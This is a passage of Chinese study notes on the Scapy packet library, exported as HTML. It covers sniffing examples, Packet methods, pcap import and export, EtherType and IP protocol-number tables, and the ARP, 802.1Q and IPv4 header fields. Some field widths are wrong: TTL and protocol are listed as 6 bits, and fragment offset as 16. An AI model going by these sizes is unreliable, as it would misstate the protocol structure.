class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">t</span> <span class="cm-operator">=</span> <span class="cm-variable">AsyncSniffer</span>(<span class="cm-variable">iface</span><span class="cm-operator">=</span><span class="cm-string">"enp0s3"</span>, <span class="cm-variable">count</span><span class="cm-operator">=</span><span class="cm-number">200</span>)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">t</span>.<span class="cm-property">start</span>()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">t</span>.<span class="cm-property">join</span>()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">results</span> <span class="cm-operator">=</span> <span class="cm-variable">t</span>.<span class="cm-property">results</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">print</span>(<span class="cm-builtin">len</span>(<span class="cm-variable">results</span>))</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">t</span> <span class="cm-operator">=</span> <span class="cm-variable">AsyncSniffer</span>(<span class="cm-variable">prn</span><span class="cm-operator">=</span><span class="cm-keyword">lambda</span> <span class="cm-variable">x</span>: <span class="cm-variable">x</span>.<span class="cm-property">summary</span>(), <span class="cm-variable">store</span><span class="cm-operator">=</span><span class="cm-keyword">False</span>, <span class="cm-builtin">filter</span><span class="cm-operator">=</span><span class="cm-string">"tcp"</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">t</span>.<span class="cm-property">start</span>()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">time</span>.<span class="cm-property">sleep</span>(<span class="cm-number">20</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">t</span>.<span class="cm-property">stop</span>()</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 247px;"></div><div class="CodeMirror-gutters" style="display: none; height: 247px;"></div></div></div></pre></li></ul><p><code>RandString(size=None, chars=b&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;)</code></p><ul><li><span>返回指定size的字符串</span></li></ul><p><span>Packet方法</span></p><ul><li><p><a href='https://scapy.readthedocs.io/en/latest/api/scapy.packet.html#scapy.packet.Packet' target='_blank' class='url'>https://scapy.readthedocs.io/en/latest/api/scapy.packet.html#scapy.packet.Packet</a></p></li><li><p><code>firstlayer()</code></p></li><li><p><code>get_field(fld)</code></p></li><li><p><code>getfield_and_val(attr)</code></p></li><li><p><code>getfieldval(attr)</code></p></li><li><p><code>getlayer(cls, nb=1, _track=None, _subclass=None, **flt)</code></p></li><li><p><code>haslayer(cls)</code></p></li><li><p><code>hide_defaults()</code></p></li><li><p><code>init_fields()</code></p></li><li><p><code>lastlayer(layer=None)</code></p></li><li><p><code>layers()</code></p></li><li><p><code>show(dump=False, indent=3, lvl=&#39; | label_lvl=&#39;&#39;)</code></p><ul><li><span>打印或返回包的层次结构视图(如果“dump”为真). </span></li></ul></li><li><p><code>show2(dump=False, indent=3, lvl=&#39; | label_lvl=&#39;&#39;)</code></p><ul><li><span>打印或返回(当“dump”为真时)包的组装版本的层次视图, 以便计算自动字段(校验和等). </span></li></ul></li><li><p><code>sniffed_on</code></p></li><li><p><code>sprintf(format[, relax=1])</code></p><ul><li><p><span>例:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.1419px; left: 3.99304px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">p.sprintf("%.time% %-15s,IP.src% -&gt; %-15s,IP.dst% %IP.chksum% ""%03xr,IP.proto% %r,TCP.flags%")</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">p.sprintf("This is a{TCP: TCP}{UDP: UDP}{ICMP:n ICMP} packet")</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">p.sprintf("{IP:%IP.dst% {ICMP:%ICMP.type%}{TCP:%TCP.dport%}}")</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 99px;"></div><div class="CodeMirror-gutters" style="display: none; height: 99px;"></div></div></div></pre></li></ul></li><li><p><code>summary(intern=0)</code></p></li></ul><h2 id='五参数'><span>五.参数</span></h2><p><code>a,b</code><span>: 表示a, b</span></p><p><code>(a,b)</code><span>: 表示 [a, b]</span></p><p><code>SA</code><span>: 表示SYN, ACK</span></p><p><code>Rate+HE</code><span>: 表示Rate, HE</span></p><h2 id='六导入导出数据'><span>六.导入导出数据</span></h2><h3 id='61导出'><span>6.1.导出</span></h3><p><code>scapy -s mysessionpath</code></p><p><code>wrpcap(&quot;temp.cap&quot;,pkts)</code></p><h3 id='62导入'><span>6.2.导入</span></h3><p><code>save_session(&#39;session.scapy&#39;)</code></p><p><code>pkts = rdpcap(&quot;temp.cap&quot;)</code></p><p><code>pkts = sniff(offline=&quot;temp.cap&quot;)</code></p><h2 id='七可视化'><span>七.可视化</span></h2><p><code>.make_table()</code></p><ul><li><p><span>例:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#  头列值, 头行值, 显示值</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">ans</span>.<span class="cm-property">make_table</span>(<span class="cm-keyword">lambda</span> <span class="cm-variable">x</span>:(<span class="cm-variable">x</span>[<span class="cm-variable">IP</span>].<span class="cm-property">src</span>, <span class="cm-variable">x</span>[<span class="cm-variable">IP</span>].<span class="cm-property">ttl</span>, <span class="cm-variable">x</span>[<span class="cm-variable">IP</span>].<span class="cm-property">dst</span>)) &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">p</span>.<span class="cm-property">make_table</span>(<span class="cm-keyword">lambda</span> <span class="cm-variable">x</span>:(<span class="cm-variable">x</span>[<span class="cm-variable">IP</span>].<span class="cm-property">dst</span>, <span class="cm-variable">x</span>[<span class="cm-variable">TCP</span>].<span class="cm-property">dport</span>, <span class="cm-variable">x</span>[<span class="cm-variable">TCP</span>].<span class="cm-property">sprintf</span>(<span class="cm-variable">“</span><span class="cm-operator">%</span><span class="cm-variable">flags</span><span class="cm-operator">%</span><span class="cm-variable">”</span>))</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 74px;"></div><div class="CodeMirror-gutters" style="display: none; height: 74px;"></div></div></div></pre><p><code>.graph()</code></p></li><li><p><span>例:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">res</span>.<span class="cm-property">graph</span>(<span class="cm-variable">target</span><span class="cm-operator">=</span><span class="cm-string">"&gt; /share/graph.svg"</span>)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 25px;"></div><div class="CodeMirror-gutters" style="display: none; height: 25px;"></div></div></div></pre></li></ul><h2 id='八数据链路层'><span>八.数据链路层</span></h2><h3 id='81etherscapylayersl2ether'><span>8.1.Ether:</span><code>scapy.layers.l2.Ether</code></h3><details></details><ul><li><p><span>dst</span></p><ul><li><span>Destination MAC(48 bits)</span></li></ul></li><li><p><span>src</span></p><ul><li><span>Source MAC(48 bits)</span></li></ul></li><li><p><span>type</span></p><ul><li><span>Type(16 bits)</span></li><li><span>部分常见的以太类型</span></li></ul><details>  </details><figure><table><thead><tr><th><span>以太类型编号</span></th><th><span>代表协议</span></th></tr></thead><tbody><tr><td><span>0x0800</span></td><td><span>Internet Protocol version 4</span></td></tr><tr><td><span>0x0806</span></td><td><span>Address Resolution Protocol</span></td></tr><tr><td><span>0x0842</span></td><td><span>Wake-on-LAN</span></td></tr><tr><td><span>0x22F0</span></td><td><span>Audio Video Transport Protocol as defined in IEEE Std 1722-2011</span></td></tr><tr><td><span>0x22F3</span></td><td><span>IETF TRILL Protocol</span></td></tr><tr><td><span>0x6003</span></td><td><span>DECnet</span></td></tr><tr><td><span>0x8035</span></td><td><span>Reverse Address Resolution Protocol</span></td></tr><tr><td><span>0x809B</span></td><td><span>AppleTalk</span></td></tr><tr><td><span>0x80F3</span></td><td><span>AppleTalk</span></td></tr><tr><td><span>0x8100</span></td><td><span>IEEE 802.1Q</span></td></tr><tr><td><span>0x8137</span></td><td><span>IPX</span></td></tr><tr><td><span>0x8138</span></td><td><span>IPX</span></td></tr><tr><td><span>0x8204</span></td><td><span>QNX Qnet</span></td></tr><tr><td><span>0x86DD</span></td><td><span>Internet Protocol Version 6</span></td></tr><tr><td><span>0x8808</span></td><td><span>Ethernet flow control</span></td></tr><tr><td><span>0x8809</span></td><td><span>IEEE 802.3</span></td></tr><tr><td><span>0x8819</span></td><td><span>CobraNet</span></td></tr><tr><td><span>0x8847</span></td><td><span>MPLS</span></td></tr><tr><td><span>0x8848</span></td><td><span>MPLS</span></td></tr><tr><td><span>0x8863</span></td><td><span>PPPoE</span></td></tr><tr><td><span>0x8864</span></td><td><span>PPPoE</span></td></tr><tr><td><span>0x8870</span></td><td><span>Jumbo Frames</span></td></tr><tr><td><span>0x887B</span></td><td><span>HomePlug 1.0 MME</span></td></tr><tr><td><span>0x888E</span></td><td><span>IEEE 802.1X</span></td></tr><tr><td><span>0x8892</span></td><td><span>PROFINET</span></td></tr><tr><td><span>0x889A</span></td><td><span>HyperSCSI</span></td></tr><tr><td><span>0x88A2</span></td><td><span>ATA over Ethernet</span></td></tr><tr><td><span>0x88A4</span></td><td><span>EtherCAT</span></td></tr><tr><td><span>0x88A8</span></td><td><span>IEEE Std 802.1Q - Service VLAN tag identifier (S-Tag)</span></td></tr><tr><td><span>0x88AB</span></td><td><span>Ethernet Powerlink</span></td></tr><tr><td><span>0x88CC</span></td><td><span>链路层发现协议</span></td></tr><tr><td><span>0x88CD</span></td><td><span>SERCOS III</span></td></tr><tr><td><span>0x88E1</span></td><td><span>HomePlug AV MME</span></td></tr><tr><td><span>0x88E3</span></td><td><span>Media Redundancy Protocol (IEC62439-2)</span></td></tr><tr><td><span>0x88E5</span></td><td><span>IEEE 802.1AE</span></td></tr><tr><td><span>0x88E7</span></td><td><span>IEEE 802.1ah</span></td></tr><tr><td><span>0x88F7</span></td><td><span>Precision Time Protocol</span></td></tr><tr><td><span>0x8902</span></td><td><span>IEEE 802.1ag</span></td></tr><tr><td><span>0x8906</span></td><td><span>Fibre Channel over Ethernet</span></td></tr><tr><td><span>0x8914</span></td><td><span>FCoE</span></td></tr><tr><td><span>0x8915</span></td><td><span>RDMA over Converged Ethernet</span></td></tr><tr><td><span>0x892F</span></td><td><span>High-availability Seamless Redundancy</span></td></tr><tr><td><span>0x9000</span></td><td><span>Ethernet Configuration Testing Protocol</span></td></tr><tr><td><span>0x9100</span></td><td><span>double tagging</span></td></tr><tr><td></details></td><td>&nbsp;</td></tr><tr><td></details></td><td>&nbsp;</td></tr></tbody></table></figure></li></ul><h3 id='82arpscapylayersl2arp'><span>8.2.ARP:</span><code>scapy.layers.l2.ARP</code></h3><blockquote><p><span>通过解析网络层地址来找寻数据链路层地址的网络传输协议</span></p></blockquote><details></details><ul><li><p><span>硬件字段</span></p><ul><li><p><span>hwtype</span></p><ul><li><span>Hardware type</span></li><li><span>此字段指定网络链接协议类型. 例如:以太网是1. </span></li></ul></li><li><p><span>hwlen</span></p><ul><li><span>Hardware address length</span></li><li><span>硬件地址的长度(以字节为单位). 以太网地址长度为6. </span></li></ul></li><li><p><span>hwsrc</span></p><ul><li><span>Sender hardware address </span></li><li><span>发送者的媒体地址. 在ARP请求中, 此字段用于指示发送请求的主机的地址. 在ARP应答中, 此字段用于指示请求正在寻找的主机地址</span></li></ul></li><li><p><span>hwdst</span></p><ul><li><span>Target hardware address </span></li><li><span>接收人的媒体地址. 在ARP请求中, 该字段被忽略. 在ARP应答中, 此字段用于指示发起ARP请求的主机的地址. </span></li></ul></li></ul></li><li><p><span>协议字段</span></p><ul><li><p><span>ptype</span></p><ul><li><span>Protocol type</span></li><li><span>此字段指定ARP请求所针对的网络协议. 对于IPv4, 它的值是0x0800. 允许的PTYPE值与EtherType值共享一个编号空间</span></li></ul></li><li><p><span>plen</span></p><ul><li><span>Protocol address length</span></li><li><span>网络地址的长度(以字节为单位). 网络协议在PTYPE中指定. 示例:IPv4地址长度为4. </span></li></ul></li><li><p><span>psrc</span></p><ul><li><span>Sender protocol address </span></li><li><span>发送者的网络地址    </span></li></ul></li><li><p><span>pdst</span></p><ul><li><span>Target protocol address</span></li><li><span>目标接收方的网络地址. </span></li></ul></li></ul></li><li><p><span>op</span></p><ul><li><span>Operation </span></li><li><span>指定发送方执行的操作:1表示请求, 2表示应答. </span>
</details></li></ul></li></ul><h3 id='83dot1qscapylayersl2dot1q'><span>8.3.Dot1Q:</span><code>scapy.layers.l2.Dot1Q</code></h3><blockquote><p><span>IEEE 802.1Q, IEEE 802.1q定义一个关于VLAN连接介质访问控制层和IEEE 802.1D生成树协议的具体概念模型. 这个模型允许各个独立的VLAN与以太网交换机的数据链路层或路由器互相连接.   </span></p></blockquote><details></details><ul><li><p><span>prio</span></p><ul><li><span>priority</span></li></ul></li><li><p><span>vlan</span></p><ul><li><span>virtual LANs </span></li></ul></li><li><p><span>type</span></p></li><li><p><span>id</span>
</details></p></li></ul><h2 id='九网络层'><span>九.网络层</span></h2><h3 id='91ipscapylayersinetip'><span>9.1.IP:</span><code>scapy.layers.inet.IP</code></h3><blockquote><p><span>Internet Protocol </span></p></blockquote><details></details><ul><li><p><span>version: </span></p><ul><li><span>Version (4 bits)</span></li><li><span>4, 6, 7: IP, IPv6, TP/IX</span></li></ul></li><li><p><span>ihl:</span></p><ul><li><span>Internet Header Length(4 bits) </span></li></ul><blockquote><p><span>Specifies the length of the IP packet header in 32 bit words. The minimum value for a valid header is 5.</span></p></blockquote></li><li><p><span>tos: </span></p><ul><li><p><span>Type of Service (8 bits)</span></p></li><li><p><span>Differentiated Service Field(DSCP) (6 bits)</span></p><ul><li><span>设置了也没有用, 设置了DSCP也会被运营商的边界路由器重写为0</span></li></ul></li><li><p><span>Explicit Congestion Notification(ECN)  (2 bits)</span></p><ul><li><span>允许端到端通知网络拥塞, 而不会丢弃数据包</span></li></ul></li></ul></li><li><p><span>len</span></p><ul><li><span>Total Length (16 bits)</span></li></ul></li><li><p><span>id</span></p><ul><li><span>Identification (16 bits)</span></li></ul></li><li><p><span>flags</span></p><ul><li><span>Flags (3 bits)</span></li><li><span>bit 0: Reserved; must be zero.[note 1]</span></li><li><span>bit 1: Don&#39;t Fragment (DF)</span></li><li><span>bit 2: More Fragments (MF)</span></li></ul></li><li><p><span>frag</span></p><ul><li><span>Fragment Offset (16 bits)</span></li></ul><blockquote><p><span>The fragment offset field is measured in units of eight-byte blocks. It is 13 bits long and specifies the offset of a particular fragment relative to the beginning of the original unfragmented IP datagram. The first fragment has an offset of zero. This allows a maximum offset of (213 – 1) × 8 = 65,528 bytes, which would exceed the maximum IP packet length of 65,535 bytes with the header length included (65,528 + 20 = 65,548 bytes).</span></p></blockquote></li><li><p><span>ttl: </span></p><ul><li><span>Time To Live (6 bits)</span></li></ul><blockquote><p><span>IP数据包在计算机网络中可以转发的最大跳数</span></p></blockquote></li><li><p><span>proto</span></p><ul><li><p><span>Protocol (6 bits)</span></p></li><li><p><span>常用</span>
<span>Protocol Number | Protocol Name| Abbreviation </span>
<span>| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------ | ------------ |</span>
<span>| 1               | </span><a href="/wiki/Internet_Control_Message_Protocol" title="Internet Control Message Protocol"><span>Internet Control Message Protocol</span></a><span>          | ICMP         |</span>
<span>| 2               | </span><a href="/wiki/Internet_Group_Management_Protocol" title="Internet Group Management Protocol"><span>Internet Group Management Protocol</span></a><span>       | IGMP         |</span>
<span>| 6               | </span><a href="/wiki/Transmission_Control_Protocol" title="Transmission Control Protocol"><span>Transmission Control Protocol</span></a><span>                      | TCP          |</span>
<span>| 17              | </span><a href="/wiki/User_Datagram_Protocol" title="User Datagram Protocol"><span>User Datagram Protocol</span></a><span>                                           | UDP          |</span>
<span>| 41              | </span><a href="/wiki/IPv6#Tunneling" title="IPv6"><span>IPv6 encapsulation</span></a><span>                                                                         | ENCAP        |</span>
<span>| 89              | </span><a href="/wiki/Open_Shortest_Path_First" title="Open Shortest Path First"><span>Open Shortest Path First</span></a><span>                                     | OSPF         |</span>
<span>| 132             | </span><a href="/wiki/Stream_Control_Transmission_Protocol" title="Stream Control Transmission Protocol"><span>Stream Control Transmission Protocol</span></a><span> | SCTP         |</span></p></li><li><p><span>全部</span></p><details></details><figure><table><thead><tr><th><span>十进制</span></th><th><span>十六进制</span></th><th><span>关键字</span></th><th><span>协议</span></th><th><span>引用</span></th></tr></thead><tbody><tr><td><span>0</span></td><td><span>0x00</span></td><td><span>HOPOPT</span></td><td><span>IPv6逐跳选项</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2460"><span>RFC 2460</span></a></td></tr><tr><td><span>1</span></td><td><span>0x01</span></td><td><span>ICMP</span></td><td><a href="/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E6%8E%A7%E5%88%B6%E6%B6%88%E6%81%AF%E5%8D%8F%E8%AE%AE" title="互联网控制消息协议"><span>互联网控制消息协议 (ICMP) </span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc792"><span>RFC 792</span></a></td></tr><tr><td><span>2</span></td><td><span>0x02</span></td><td><span>IGMP</span></td><td><a href="/wiki/%E5%9B%A0%E7%89%B9%E7%BD%91%E7%BB%84%E7%AE%A1%E7%90%86%E5%8D%8F%E8%AE%AE" title="因特网组管理协议"><span>因特网组管理协议 (IGMP) </span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1112"><span>RFC 1112</span></a></td></tr><tr><td><span>3</span></td><td><span>0x03</span></td><td><span>GGP</span></td><td><a href="/w/index.php?title=%E7%BD%91%E5%85%B3%E5%AF%B9%E7%BD%91%E5%85%B3%E5%8D%8F%E8%AE%AE&amp;action=edit&amp;redlink=1" class="new" title="网关对网关协议 (页面不存在) "><span>网关对网关协议</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc823"><span>RFC 823</span></a></td></tr><tr><td><span>4</span></td><td><span>0x04</span></td><td><span>IPv4</span></td><td><a href="/wiki/IPv4" title="IPv4"><span>IPv4</span></a><span> (封装)</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc791"><span>RFC 791</span></a></td></tr><tr><td><span>5</span></td><td><span>0x05</span></td><td><span>ST</span></td><td><a href="/wiki/%E5%9B%A0%E7%89%B9%E7%BD%91%E6%B5%81%E5%8D%8F%E8%AE%AE" title="因特网流协议"><span>因特网流协议</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1190"><span>RFC 1190</span></a><span>, </span><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc1819"><span>RFC 1819</span></a></td></tr><tr><td><span>6</span></td><td><span>0x06</span></td><td><span>TCP</span></td><td><a href="/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE" title="传输控制协议"><span>传输控制协议 (TCP) </span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc793"><span>RFC 793</span></a></td></tr><tr><td><span>7</span></td><td><span>0x07</span></td><td><span>CBT</span></td><td><a href="/w/index.php?title=%E6%9C%89%E6%A0%B8%E6%A0%91%E7%BB%84%E6%92%AD%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE&amp;action=edit&amp;redlink=1" class="new" title="有核树组播路由协议 (页面不存在) "><span>有核树组播路由协议</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc2189"><span>RFC 2189</span></a></td></tr><tr><td><span>8</span></td><td><span>0x08</span></td><td><span>EGP</span></td><td><a href="/wiki/%E5%A4%96%E9%83%A8%E7%BD%91%E5%85%B3%E5%8D%8F%E8%AE%AE" title="外部网关协议"><span>外部网关协议</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc888"><span>RFC 888</span></a></td></tr><tr><td><span>9</span></td><td><span>0x09</span></td><td><span>IGP</span></td><td><a href="/wiki/%E5%86%85%E9%83%A8%E7%BD%91%E5%85%B3%E5%8D%8F%E8%AE%AE" title="内部网关协议"><span>内部网关协议</span></a><span> (任意私有内部网关 (用于思科的IGRP) )</span></td><td>&nbsp;</td></tr><tr><td><span>10</span></td><td><span>0x0A</span></td><td><span>BBN-RCC-MON</span></td><td><span>BBN RCC 监视</span></td><td>&nbsp;</td></tr><tr><td><span>11</span></td><td><span>0x0B</span></td><td><span>NVP-II</span></td><td><a href="/wiki/%E7%BD%91%E7%BB%9C%E8%AF%AD%E9%9F%B3%E5%8D%8F%E8%AE%AE" class="mw-redirect" title="网络语音协议"><span>网络语音协议</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc741"><span>RFC 741</span></a></td></tr><tr><td><span>12</span></td><td><span>0x0C</span></td><td><span>PUP</span></td><td><span>Xerox </span><a href="/w/index.php?title=PUP&amp;action=edit&amp;redlink=1" class="new" title="PUP (页面不存在) "><span>PUP</span></a></td><td>&nbsp;</td></tr><tr><td><span>13</span></td><td><span>0x0D</span></td><td><span>ARGUS</span></td><td><span>ARGUS</span></td><td>&nbsp;</td></tr><tr><td><span>14</span></td><td><span>0x0E</span></td><td><span>EMCON</span></td><td><span>EMCON</span></td><td>&nbsp;</td></tr><tr><td><span>15</span></td><td><span>0x0F</span></td><td><span>XNET</span></td><td><span>Cross Net Debugger</span></td><td><span>IEN 158</span></td></tr><tr><td><span>16</span></td><td><span>0x10</span></td><td><span>CHAOS</span></td><td><span>Chaos</span></td><td>&nbsp;</td></tr><tr><td><span>17</span></td><td><span>0x11</span></td><td><span>UDP</span></td><td><a href="/wiki/%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE%E6%8A%A5%E5%8D%8F%E8%AE%AE" title="用户数据报协议"><span>用户数据报协议 (UDP) </span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc768"><span>RFC 768</span></a></td></tr><tr><td><span>18</span></td><td><span>0x12</span></td><td><span>MUX</span></td><td><a href="/w/index.php?title=Multiplexing&amp;action=edit&amp;redlink=1" class="new" title="Multiplexing (页面不存在) "><span>Multiplexing</span></a></td><td><span>IEN 90</span></td></tr><tr><td><span>19</span></td><td><span>0x13</span></td><td><span>DCN-MEAS</span></td><td><span>DCN Measurement Subsystems</span></td><td>&nbsp;</td></tr><tr><td><span>20</span></td><td><span>0x14</span></td><td><span>HMP</span></td><td><a href="/w/index.php?title=Host_Monitoring_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Host Monitoring Protocol (页面不存在) "><span>Host Monitoring Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc869"><span>RFC 869</span></a></td></tr><tr><td><span>21</span></td><td><span>0x15</span></td><td><span>PRM</span></td><td><span>Packet Radio Measurement</span></td><td>&nbsp;</td></tr><tr><td><span>22</span></td><td><span>0x16</span></td><td><span>XNS-IDP</span></td><td><span>XEROX NS IDP</span></td><td>&nbsp;</td></tr><tr><td><span>23</span></td><td><span>0x17</span></td><td><span>TRUNK-1</span></td><td><span>Trunk-1</span></td><td>&nbsp;</td></tr><tr><td><span>24</span></td><td><span>0x18</span></td><td><span>TRUNK-2</span></td><td><span>Trunk-2</span></td><td>&nbsp;</td></tr><tr><td><span>25</span></td><td><span>0x19</span></td><td><span>LEAF-1</span></td><td><span>Leaf-1</span></td><td>&nbsp;</td></tr><tr><td><span>26</span></td><td><span>0x1A</span></td><td><span>LEAF-2</span></td><td><span>Leaf-2</span></td><td>&nbsp;</td></tr><tr><td><span>27</span></td><td><span>0x1B</span></td><td><span>RDP</span></td><td><a href="/w/index.php?title=Reliable_Datagram_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Reliable Datagram Protocol (页面不存在) "><span>Reliable Datagram Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc908"><span>RFC 908</span></a></td></tr><tr><td><span>28</span></td><td><span>0x1C</span></td><td><span>IRTP</span></td><td><a href="/w/index.php?title=Internet_Reliable_Transaction_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Internet Reliable Transaction Protocol (页面不存在) "><span>Internet Reliable Transaction Protocol</span></a></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc938"><span>RFC 938</span></a></td></tr><tr><td><span>29</span></td><td><span>0x1D</span></td><td><span>ISO-TP4</span></td><td><span>ISO Transport Protocol Class 4</span></td><td><a class="external mw-magiclink-rfc" rel="nofollow" href="https://tools.ietf.org/html/rfc905"><span>RFC 905</span></a></td></tr><tr><td><span>30</span></td><td><span>0x1E</span></td><td><span>NETBLT</span></td><td><a href="/w/index.php?title=Bulk_Data_Transfer_Protocol&amp;action=edit&amp;redlink=1" class="new" title="Bulk Data Transfer Protocol (页面不存在) "><span>Bulk Data Transfer 